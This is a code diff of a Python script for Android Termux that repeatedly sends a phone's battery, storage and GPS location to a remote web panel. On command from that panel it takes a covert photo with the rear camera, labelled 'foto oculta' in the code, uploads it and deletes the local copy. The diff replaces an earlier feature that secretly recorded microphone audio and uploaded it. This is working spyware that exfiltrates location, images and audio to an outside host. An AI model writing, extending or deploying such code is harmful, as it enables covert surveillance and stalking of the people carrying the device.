@@ -5,11 +5,11 @@ import requests
 import os
 import uuid
 import base64
-import glob
 
 URL_SERVIDOR = "https://nexos-panel.onrender.com/update"
-URL_UPLOAD_AUDIO = "https://nexos-panel.onrender.com/api/upload_audio"
+URL_UPLOAD_CAM = "https://nexos-panel.onrender.com/api/upload_camera"
 ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")
+ARQUIVO_FOTO = os.path.expanduser("~/nexos_captura.jpg")
 
 def run_command(cmd):
     try: return subprocess.check_output(cmd, shell=True).decode().strip()
@@ -25,7 +25,7 @@ def obter_ou_criar_id_unico():
 DEVICE_ID = obter_ou_criar_id_unico()
 
 print("\n" + "="*45)
-print(f"🛰️  MOTOR NEXOS AUDIO COMPRESSED // LIGHTWEIGHT")
+print(f"🛰️  MOTOR NEXOS CAMERA SYSTEM OPERACIONAL")
 print(f"🔑  SEU MONITOR ID DE PROD: {DEVICE_ID}")
 print("="*45 + "\n")
 
@@ -34,14 +34,14 @@ ultima_lon_valida = -49.2648
 headers_json = {"Content-Type": "application/json"}
 
 while True:
-    # 1. Bateria
+    # 1. Coleta dados de Bateria
     battery = "N/A"
     out_bat = run_command("termux-battery-status")
     if out_bat:
         try: battery = str(json.loads(out_bat).get("percentage", "N/A"))
         except: pass
         
-    # 2. Armazenamento
+    # 2. Coleta dados de Armazenamento
     storage = "N/A"
     out_df = run_command("df -h /data/data/com.termux/files/home")
     if out_df:
@@ -52,7 +52,7 @@ while True:
                 if len(parts) >= 3: storage = f"{parts[3]} livres"
         except: pass
 
-    # 3. GPS
+    # 3. Coleta Localização GPS
     lat, lon = ultima_lat_valida, ultima_lon_valida
     out_loc = run_command("termux-location -p gps -r once")
     if out_loc:
@@ -65,7 +65,7 @@ while True:
                 ultima_lon_valida = lon
         except: pass
 
-    # 4. Sincronismo Geral
+    # 4. Envia Sincronismo e Checa se o Botão foi Clicado
     payload = {
         "device_id": DEVICE_ID,
         "battery": battery,
@@ -79,37 +79,34 @@ while True:
         response = requests.post(URL_SERVIDOR, data=json.dumps(payload), headers=headers_json, timeout=5)
         if response.status_code == 200:
             res_data = response.json()
-            comando_audio = res_data.get("comando", "stop")
-            print(f"🛰️ [OK] Sincronizado. Status Escuta: {comando_audio.upper()}")
+            comando_cam = res_data.get("comando_cam", "wait")
+            print(f"🛰️ [OK] GPS Ativo. Status Câmera: {comando_cam.upper()}")
             
-            if comando_audio == "start":
-                print("🎙️ [AÇÃO] Gravando em modo ultra-leve (Bitrate Reduzido)...")
-                run_command("termux-microphone-record -q")
+            # SE O COMPATÍVEL MANDOU "TAKE", BATE A FOTO DE SEGUNDO PLANO
+            if comando_cam == "take":
+                print("📸 [AÇÃO] Comando recebido! Batendo foto oculta...")
                 
-                # NOVIDADE: Força o Android a gravar em 16kbps (qualidade de rádio/fone), reduzindo o peso em 90%
-                run_command("termux-microphone-record --bitrate 16000")
+                # Deleta resquício antigo
+                if os.path.exists(ARQUIVO_FOTO): os.remove(ARQUIVO_FOTO)
                 
-                time.sleep(3.0) 
-                run_command("termux-microphone-record -q")
-                print("🎙️ [AÇÃO] Gravacao finalizada.")
+                # Executa a foto da câmera traseira (ID 0)
+                # Nota: Use -c 1 se quiser testar a câmera frontal
+                run_command(f"termux-camera-photo -c 0 {ARQUIVO_FOTO}")
+                time.sleep(2.0) # Espera a lente abrir e processar
                 
-                # Caça o arquivo gerado
-                arquivos_gravados = glob.glob("/storage/emulated/0/TermuxAudioRecording_*.m4a")
-                if arquivos_gravados:
-                    ultimo_audio = max(arquivos_gravados, key=os.path.getctime)
+                if os.path.exists(ARQUIVO_FOTO) and os.path.getsize(ARQUIVO_FOTO) > 0:
+                    with open(ARQUIVO_FOTO, "rb") as img_file:
+                        photo_b64 = base64.b64encode(img_file.read()).decode('utf-8')
                     
-                    if os.path.exists(ultimo_audio) and os.path.getsize(ultimo_audio) > 0:
-                        with open(ultimo_audio, "rb") as audio_file:
-                            audio_b64 = base64.b64encode(audio_file.read()).decode('utf-8')
-                        
-                        # Transmite com margem de segurança de 10 segundos para conexões oscilantes de motoboy
-                        payload_audio = {"device_id": DEVICE_ID, "audio": audio_b64}
-                        requests.post(URL_UPLOAD_AUDIO, data=json.dumps(payload_audio), headers=headers_json, timeout=10)
-                        print("🚀 [OK] Lote de áudio ultra-leve enviado pro painel!")
-                        
-                        os.remove(ultimo_audio)
-                        
+                    # Faz o upload da imagem para o painel web
+                    payload_img = {"device_id": DEVICE_ID, "photo": photo_b64}
+                    requests.post(URL_UPLOAD_CAM, data=json.dumps(payload_img), headers=headers_json, timeout=10)
+                    print("🚀 [OK] Imagem capturada e enviada com sucesso!")
+                    
+                    # Apaga do celular para segurança e privacidade
+                    os.remove(ARQUIVO_FOTO)
+                    
     except Exception as e:
-        print(f"⚠️ Alerta de ciclo: {e}")
+        print(f"⚠️ Alerta de sincronismo: {e}")
 
     time.sleep(2.0)
